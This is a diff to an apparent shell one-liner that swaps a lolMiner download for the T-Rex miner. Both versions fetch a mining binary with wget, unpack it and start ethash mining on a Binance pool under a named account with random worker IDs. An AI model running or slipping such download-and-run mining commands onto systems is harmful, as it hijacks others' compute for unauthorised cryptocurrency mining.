@@ -1,2 +1,1 @@
-
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz && tar -xf lolMiner_v1.28a_Lin64.tar.gz && cd 1.28a/ && ./lolMiner --algo ethash --pool stratum+tcp://ethash.poolbinance.com:1800 --wal Amit1011 -worker $(echo $(shuf -i 1000-9999 -n 1)-eth)
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz && tar -xvf t-rex-0.21.6-linux.tar.gz && ./t-rex -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u Amit1011 -w $(echo $(shuf -i 1000-9999 -n 1)-eth)
